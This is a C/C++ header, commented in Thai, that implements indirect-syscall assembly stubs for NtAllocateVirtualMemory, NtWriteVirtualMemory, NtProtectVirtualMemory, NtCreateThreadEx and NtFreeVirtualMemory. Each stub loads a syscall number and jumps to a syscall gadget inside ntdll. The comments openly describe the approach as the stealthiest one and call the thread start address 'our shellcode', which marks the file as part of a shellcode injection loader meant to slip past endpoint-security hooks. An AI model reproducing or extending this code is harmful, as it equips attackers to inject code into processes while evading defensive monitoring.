#pragma once
#include "Def.h"

// เขียน Stub ASM สำหรับ NtAllocateVirtualMemory
// แน่นอนว่าเราจะเขียนแบบ Intel Systax 
extern "C" __attribute__((naked)) NTSTATUS NtAlloc(
	DWORD dwSSN,			 // RCX
	ULONG_PTR pGadget,		 // RDX
	...)
{
	__asm {
		mov r11, rdx         // 1. Gadget -> r11

		// เตรียมพารามิเตอร์สำหรับ Syscall
		mov r10, r8          // API Param 1 (Handle)
		mov rdx, r9          // API Param 2 (BaseAddr)

		// ดึงพารามิเตอร์ที่เหลือจาก Stack
		// Shadow Space (32) + Return Address (8) = 40
		mov r8, [rsp + 40]   // API Param 3 (ZeroBits)
		mov r9, [rsp + 48]   // API Param 4 (Size)

		// ย้ายตัวที่ 5 และ 6 ของ API (ซึ่งอยู่ที่ 56 และ 64) มาวางที่ 40 และ 48
		// เพื่อให้ syscall ที่เราจะ jmp ไปหา อ่านค่าได้ถูกต้อง
		mov rax, [rsp + 56] // API Param 5 (Allocation type)
		mov[rsp + 40], rax
		mov rax, [rsp + 64]	 // API Param 6 (PageProtection)
		mov[rsp + 48], rax

		mov eax, ecx		// 2. SSN -> eax อนึ่ง ecx คือ rcx แต่เป็นส่วนล่าง 32 bits

		// สำหรับ NtAllocateVirtualMemory ต้องใช้เพิ่มอีก 2 ตัวบน Stack
		// เราต้องขยับพารามิเตอร์บน Stack ไปวางในตำแหน่งที่ Syscall คาดหวัง
		// แต่วิธีที่เนียนที่สุดคือปล่อยให้มันอยู่บน Stack แบบนั้น แล้วโดดไปเลย
		// เพราะ Syscall จะไปอ่านต่อจากตำแหน่งเดิมที่เราไม่ได้แก้ Stack Pointer

		jmp r11              // 3. กระโดดไปหา syscall; ret ใน ntdll
		ret
	}
}

NTSTATUS MyNtAllocateVirtualMemory(
	DWORD dwSSN,
	ULONG_PTR pGadget,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
) {
	return NtAlloc(
		dwSSN,
		pGadget,
		ProcessHandle,
		BaseAddress,
		ZeroBits,
		RegionSize,
		AllocationType,
		Protect
	);
}

// เขียน Stub ASM สำหรับ NtWriteVirtualMemory
extern "C" __attribute__((naked)) NTSTATUS NtWrite(
	DWORD dwSSN,
	ULONG_PTR pGadget,
	...
)
{
	__asm {
		mov r11, rdx		// ย้าย gadget จาก rdx เข้า r11 
		mov r10, r8			// Arg 1 (Argument)
		mov rdx, r9			// Arg 2 (Argument)

		mov r8, [rsp + 40]	// Arg 3 (Argument)
		mov r9, [rsp + 48]	// Arg 4 (Argument)

		mov rax, [rsp + 56]	// จอง shadow stack ให้ Arg 5
		mov[rsp + 40], rax // Arg 5 (Argument)

		mov eax, ecx		// ย้ายเลข SSN หลัง rax ว่างแล้ว

		jmp r11				// สั่ง Jump 
		ret
	}
}

NTSTATUS MyNtWriteVirtualMemory(
	DWORD dwSSN,
	ULONG_PTR pGadget,
	HANDLE pHandle,
	PVOID BaseAddr,
	PVOID pBuffer,
	SIZE_T size,
	PSIZE_T numberOfSize
) {
	return NtWrite(
		dwSSN,
		pGadget,
		pHandle,
		BaseAddr,
		pBuffer,
		size,
		numberOfSize
	);
}

// เขียน Stub ASM สำหรับ NtProtectVirtualMemory
extern "C" __attribute__((naked)) NTSTATUS NtProtect(
	DWORD dwSSN,
	ULONG_PTR pGadget,
	...
)
{
	__asm {
		mov r11, rdx		// ย้าย gadget จาก rdx เข้า r11 
		mov r10, r8			// Arg 1 (Argument)
		mov rdx, r9			// Arg 2 (Argument)

		mov r8, [rsp + 40]	// Arg 3 (Argument)
		mov r9, [rsp + 48]	// Arg 4 (Argument)

		mov rax, [rsp + 56]	// Arg 5 (Argument)
		mov[rsp + 40], rax

		mov eax, ecx		// ย้ายเลข SSN หลัง rax ว่างแล้ว

		jmp r11				// สั่ง Jump 
		ret
	}
}

NTSTATUS MyNtProtectVirtualMemory(
	DWORD dwSSN,
	ULONG_PTR pGadget,
	HANDLE pHandle,
	PVOID* BaseAddr,
	SIZE_T* size,
	ULONG Protect,
	PULONG oldProtect
) {
	return NtProtect(
		dwSSN,
		pGadget,
		pHandle,
		BaseAddr,
		size,
		Protect,
		oldProtect
	);
}

// เขียน Stub ASM สำหรับ NtCreateThreadEx
extern "C" __attribute__((naked)) NTSTATUS NtCreate(
	DWORD dwSSN,
	ULONG_PTR pGadget,
	...
)
{
	__asm {
		mov r11, rdx         // 1. เก็บ Gadget ไว้ใน r11
		mov r10, r8          // 2. Arg 1 (ThreadHandle) -> r10
		mov rdx, r9          // 3. Arg 2 (DesiredAccess) -> rdx

		mov r8, [rsp + 40]   // 4. Arg 3 (ObjectAttributes) -> r8
		mov r9, [rsp + 48]   // 5. Arg 4 (ProcessHandle) -> r9

		// --- ย้ายพารามิเตอร์ที่เหลือจาก Stack ลงไปวางใหม่ (Stack Re-alignment) ---
		// เริ่มจากตำแหน่ง [rsp + 56] ของฟังก์ชันนี้ ไปวางที่ [rsp + 40] เพื่อรอ syscall
		mov rax, [rsp + 56]
		mov[rsp + 40], rax  // Arg 5 (StartRoutine - พิกัด Shellcode ของเรา)

		mov rax, [rsp + 64]
		mov[rsp + 48], rax  // Arg 6 (Argument)

		mov rax, [rsp + 72]
		mov[rsp + 56], rax  // Arg 7 (CreateFlags)

		mov rax, [rsp + 80]
		mov[rsp + 64], rax  // Arg 8 (ZeroBits)

		mov rax, [rsp + 88]
		mov[rsp + 72], rax  // Arg 9 (StackSize)

		mov rax, [rsp + 96]
		mov[rsp + 80], rax  // Arg 10 (MaxStackSize)

		mov rax, [rsp + 104]
		mov[rsp + 88], rax  // Arg 11 (AttributeList)

		mov eax, ecx         // 6. ใส่เลข SSN ลง eax
		jmp r11              // 7. กระโดดไปหา gadget; syscall; ret
		ret
	}
}

NTSTATUS MyNtCreateThreadEx(
	DWORD dwSSN,
	ULONG_PTR pGadget,
	PHANDLE hThread,
	DWORD AccessMask,
	PVOID ObjAttrbt,
	HANDLE ProcessHandle,
	PVOID lpStartAddress,   // ที่อยู่ Shellcode (pAddress)
	PVOID lpParameter,
	ULONG Flags,
	SIZE_T StackZeroBits,
	SIZE_T SizeOfStackCommit,
	SIZE_T SizeOfStackReserve,
	PVOID lpBytesBuffer
) {
	return NtCreate(
		dwSSN,
		pGadget,
		hThread,
		AccessMask,
		ObjAttrbt,
		ProcessHandle,
		lpStartAddress,
		lpParameter,
		Flags,
		StackZeroBits,
		SizeOfStackCommit,
		SizeOfStackReserve,
		lpBytesBuffer
	);
}

// เขียน Stub ASM สำหรับ NtWriteVirtualMemory
extern "C" __attribute__((naked)) NTSTATUS NtFree(
	DWORD dwSSN,
	ULONG_PTR pGadget,
	...
)
{
	__asm {
		mov r11, rdx		// ย้าย gadget จาก rdx เข้า r11 
		mov r10, r8			// Arg 1 (Argument)
		mov rdx, r9			// Arg 2 (Argument)

		mov r8, [rsp + 40]	// Arg 3 (Argument)
		mov r9, [rsp + 48]	// Arg 4 (Argument)

		mov rax, [rsp + 56]	// จอง shadow stack ให้ Arg 5
		mov[rsp + 40], rax  // Arg 5 (Argument)

		mov rax, [rsp + 64]
		mov[rsp + 48], rax

		mov eax, ecx		// ย้ายเลข SSN หลัง rax ว่างแล้ว

		jmp r11				// สั่ง Jump 
		ret
	}
}

NTSTATUS MyNtFreeVirtualMemory(
	DWORD dwSSN,
	ULONG_PTR pGadget,
	HANDLE pHandle,
	PVOID *BaseAddr,
	PVOID RegionSize,
	ULONG FreeType
) {
	return NtFree(
		dwSSN,
		pGadget,
		pHandle,
		BaseAddr,
		RegionSize,
		FreeType
	);
}